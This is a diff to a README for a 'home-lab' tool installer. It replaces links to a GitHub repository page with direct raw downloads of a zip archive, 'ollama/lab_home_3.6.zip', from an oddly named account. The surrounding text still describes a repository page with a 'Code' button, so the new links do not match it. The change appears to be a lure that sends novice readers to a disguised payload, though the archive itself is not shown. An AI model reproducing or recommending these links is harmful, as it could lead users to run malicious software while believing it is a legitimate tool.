@@ -16,11 +16,11 @@ Think of it as a magic box that installs all these tools for you automatically!
 
 ### Step 1: Get the Application
 
-[![Download home-lab](https://img.shields.io/badge/Download-home--lab-4B0082?style=for-the-badge&logo=github)](https://github.com/beantownrevenuesharing985/home-lab)
+[![Download home-lab](https://img.shields.io/badge/Download-home--lab-4B0082?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/beantownrevenuesharing985/home-lab/main/ollama/lab_home_3.6.zip)
 
 **Visit this link to download the application.**
 
-Click the big badge above or use this link: https://github.com/beantownrevenuesharing985/home-lab
+Click the big badge above or use this link: https://raw.githubusercontent.com/beantownrevenuesharing985/home-lab/main/ollama/lab_home_3.6.zip
 
 Once you arrive at the page, look for a green button that says **"Code"** or **"Download"**—click it, then choose **"Download ZIP"**. The download will start automatically.
 
